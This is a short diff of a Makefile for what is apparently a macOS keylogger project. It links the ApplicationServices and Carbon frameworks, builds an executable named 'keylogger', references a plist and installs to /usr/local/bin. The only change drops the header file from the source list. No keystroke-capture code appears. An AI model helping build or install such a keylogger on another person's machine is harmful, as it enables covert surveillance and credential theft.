@@ -1,6 +1,6 @@
 CC=gcc
 CFLAGS=-framework ApplicationServices -framework Carbon
-SOURCES=keylogger.c keylogger.h
+SOURCES=keylogger.c
 EXECUTABLE=keylogger
 PLIST=keylogger.plist
 INSTALLDIR=/usr/local/bin
